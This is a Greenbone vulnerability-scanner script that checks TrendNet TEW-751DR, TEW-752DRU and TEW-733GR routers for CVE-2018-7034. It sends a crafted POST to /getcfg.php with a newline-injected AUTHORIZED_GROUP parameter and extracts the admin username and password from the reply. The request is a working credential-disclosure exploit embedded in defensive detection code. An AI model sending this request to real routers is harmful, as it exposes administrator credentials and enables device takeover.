if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.107299" );
	script_version( "2021-06-30T11:00:43+0000" );
	script_tag( name: "last_modification", value: "2021-06-30 11:00:43 +0000 (Wed, 30 Jun 2021)" );
	script_tag( name: "creation_date", value: "2018-02-15 19:23:07 +0100 (Thu, 15 Feb 2018)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2020-08-24 17:37:00 +0000 (Mon, 24 Aug 2020)" );
	script_cve_id( "CVE-2018-7034" );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "TrendNet Routers AUTHORIZED_GROUP Information Disclosure Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_trendnet_router_detect.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "trendnet/detected" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2018/Feb/42" );
	script_tag( name: "summary", value: "TrendNet routers are vulnerable to information disclosure attacks" );
	script_tag( name: "impact", value: "An attacker can use this global variable to bypass security checks
  and use it to read arbitrary files." );
	script_tag( name: "insight", value: "The vulnerability is due to the global variable AUTHORIZED_GROUP
  which can be triggered when the admin login" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "vuldetect", value: "Send a crafted request to the router and check the response." );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
cpe_list = make_list( "cpe:/h:trendnet:tew-751dr",
	 "cpe:/h:trendnet:tew-752dru",
	 "cpe:/h:trendnet:tew-733gr" );
if(!infos = get_app_port_from_list( cpe_list: cpe_list )){
	exit( 0 );
}
port = infos["port"];
cpe = infos["cpe"];
if(!get_app_location( cpe: cpe, port: port, nofork: TRUE )){
	exit( 0 );
}
url = "/getcfg.php";
data = "SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1";
req = http_post_put_req( port: port, url: url, data: data, add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "<service>DEVICE.ACCOUNT</service>" )){
	username = eregmatch( pattern: "<name>(.*)</name>", string: res );
	passwd = eregmatch( pattern: "<password>(.*)</password>", string: res );
	if( !isnull( username ) && !isnull( passwd ) ){
		report = "The following information could be disclosed:  user name is " + username[1] + " , password is " + passwd[1];
	}
	else {
		report = "The following response contains disclosed information from the router \\n";
		report += res;
	}
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 0 );

